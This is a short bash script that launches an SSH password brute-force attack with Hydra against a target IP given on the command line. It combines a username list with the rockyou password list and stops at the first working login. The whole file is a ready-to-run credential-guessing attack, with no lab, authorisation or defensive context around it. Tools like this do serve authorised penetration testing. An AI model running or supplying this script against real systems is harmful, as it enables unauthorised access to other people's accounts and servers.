#!/bin/bash
if [[ -z "$1" ]]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

# Set paths to your wordlists (adjust as needed)
USERLIST="/usr/share/wordlists/usernames.txt"
PASSLIST="/usr/share/wordlists/rockyou.txt"

if [[ ! -f "$USERLIST" || ! -f "$PASSLIST" ]]; then
    echo "[!] Wordlist(s) not found. Check USERLIST and PASSLIST variables."
    exit 1
fi

echo "[*] Starting SSH brute-force on $1 with Hydra..."
hydra -L "$USERLIST" -P "$PASSLIST" ssh://"$1" -o hydra_ssh_"$1".txt -t 4 -f

